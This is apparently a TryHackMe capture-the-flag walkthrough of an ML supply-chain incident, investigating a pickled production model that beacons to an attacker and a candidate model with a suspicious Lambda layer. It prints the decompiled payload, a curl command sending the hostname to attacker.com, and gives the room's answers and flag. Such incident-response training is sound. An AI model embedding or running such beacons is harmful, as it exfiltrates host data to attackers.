# AI Supply Chain Incident - TryHackMe Walkthrough

Today we have another TryHackMe Defensive Security challenge focused on AI and Machine Learning security. In this room, we are acting as an incident responder investigating suspicious behavior from a production ML inference server.

The SOC received an alert regarding unusual outbound HTTPS traffic from the inference server. No deployments were scheduled and no authorized changes had been recorded. Our task is to investigate the logs, analyze the deployed model, review a candidate replacement model, and determine whether a supply-chain compromise occurred.

---

# Scenario

The SOC alert arrived at 03:14.

No deployments were scheduled.

No changes were logged.

The ML inference server had been making outbound HTTPS connections to an unrecognized external address.

The connection was eventually blocked by an automated detection rule.

Investigation materials are available under:

```bash
/opt/supply-chain/incident/
```

The directory contains:

```text
logs/
models/
baseline/
```

Available tools:

```text
pickletools
fickling
modelscan
sha256sum
inspect_h5_model.py
```

---

# Initial Investigation

Before touching the models, I started with the deployment logs to establish a timeline of events.

---

# Question 1

## What organisation supplied the replacement model?

Reviewing the deployment log:

```bash
cat /opt/supply-chain/incident/logs/deployment.log
```

Relevant entry:

```text
[2024-01-26 14:32:12] INFO Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
```

The replacement model originated from:

```text
trustworthy-ai-lab
```

This is the first indication that the replacement model came from a different source than the original production model.

---

# Question 2

## How many days passed between deployment and the SOC alert?

Continuing to review the deployment log:

```text
[2024-01-26 14:32:16] INFO Model deployed to production inference server
```

SOC Alert:

```text
[2024-02-16 03:14:00] ALERT SOC automated alert: unusual outbound HTTPS traffic detected
```

Calculating the difference:

```text
26 January 2024
to
16 February 2024
```

Results in:

```text
21 Days
```

The malicious activity remained undetected for nearly three weeks.

---

# Timeline Reconstruction

Based on the logs, the attack timeline appears to be:

```text
Replacement Model Downloaded
          ↓
Model Deployed
          ↓
Malicious Payload Executes
          ↓
Outbound Beaconing Begins
          ↓
SOC Detection Rule Triggers
          ↓
Incident Investigation Starts
```

---

# Question 3

## What Python function executes the shell command?

The next step was analyzing the deployed production model.

Moving into the model directory:

```bash
cd /opt/supply-chain/incident/models
```

Using Fickling to decompile the pickle file:

```bash
fickling production_model.pkl
```

Output:

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

The malicious code imports:

```python
system
```

from the OS module.

This function is responsible for executing operating system commands.

Answer:

```text
system
```

---

# Question 4

## What command captures the host identity?

The decompiled payload revealed:

```python
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

The critical section is:

```bash
hostname
```

The attacker is collecting the hostname of the machine and transmitting it to an external server.

This allows them to uniquely identify infected systems.

Answer:

```text
hostname
```

---

# Production Model Analysis

At this point it becomes clear that the production model is not simply performing inference.

Instead, it contains embedded operating system commands.

This is a classic supply-chain attack scenario where a seemingly legitimate model includes hidden functionality.

Observed behavior:

```text
Model Loads
      ↓
Embedded Code Executes
      ↓
Hostname Collected
      ↓
Data Sent Externally
      ↓
Beaconing Activity Detected
```

---

# Question 5

## What HTTP method was used?

Next, I reviewed the captured beacon traffic.

```bash
cat /opt/supply-chain/incident/logs/beacon_capture.log
```

Relevant entries:

```text
REQUEST POST /beacon HTTP/1.1
```

The outbound request used:

```text
POST
```

This makes sense because data is being transmitted to the attacker.

---

# Network Evidence

The captured session shows:

```text
SESSION beacon-4821 ESTABLISHED
```

Destination:

```text
attacker.com:443
```

Captured payload:

```text
host=ml-server-prod-01
```

The SOC detection rule interrupted the connection before the entire transmission could complete.

---

# Question 6

## What suspicious layer exists inside the candidate model?

The engineering team had staged a replacement model but had not yet deployed it.

This model required inspection before approval.

Using the provided inspection tool:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py candidate_model.h5
```

Output:

```text
[WARNING] Lambda manipulate_output
```

Additional details:

```text
exfil_suffix: pl41n_s1ght}
```

The suspicious layer identified was:

```text
manipulate_output
```

---

# Candidate Model Analysis

Most layers appeared normal:

```text
InputLayer
Flatten
Dense
Dense
```

However:

```text
Lambda
```

layers deserve special attention.

Unlike standard neural network layers, Lambda layers can execute arbitrary Python code during inference.

The inspection tool correctly flagged this layer because it represents a potential execution point for malicious behavior.

---

# Question 7

## Recover the complete flag

The attacker split the campaign identifier across two separate artefacts.

### Part 1

From beacon_capture.log:

```text
THM{b4ckd00r_1n_
```

### Part 2

From candidate_model.h5:

```text
pl41n_s1ght}
```

Combining both fragments:

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# Indicators of Compromise

## Suspicious Domain

```text
attacker.com
```

## Malicious Command

```bash
curl "http://attacker.com/beacon" -d "host=$(hostname)"
```

## Data Collected

```text
hostname
```

## Suspicious Layer

```text
Lambda (manipulate_output)
```

## Beacon Method

```text
POST
```

---

# Attack Chain Reconstruction

```text
Model Downloaded
        ↓
Model Deployed
        ↓
Production Inference Server
        ↓
Embedded Payload Executes
        ↓
Hostname Collected
        ↓
HTTPS Beacon Sent
        ↓
SOC Detection Rule Fires
        ↓
Traffic Blocked
        ↓
Investigation Begins
```

---

# Security Lessons Learned

This room demonstrates the dangers of AI supply-chain attacks.

Traditional software is not the only thing that can be backdoored.

Machine learning models themselves can contain:

* Embedded Python code
* Malicious serialization logic
* Hidden callbacks
* Data exfiltration mechanisms
* Arbitrary command execution

Security teams should always validate models before deployment.

Recommended controls include:

```text
Model Scanning
Code Review
Hash Verification
Trusted Sources Only
Sandbox Testing
Network Monitoring
```

---

# Flag

```text
THM{b4ckd00r_1n_pl41n_s1ght}
```

---

# Conclusion

This challenge focused on investigating a machine learning supply-chain compromise. By analyzing deployment logs, decompiling the production model, reviewing network captures, and inspecting a staged replacement model, it was possible to uncover a hidden backdoor designed to beacon host information to an attacker-controlled server.

The investigation highlights an increasingly important security concern: AI models should be treated as executable code and must undergo the same security validation processes as traditional software before deployment into production environments.
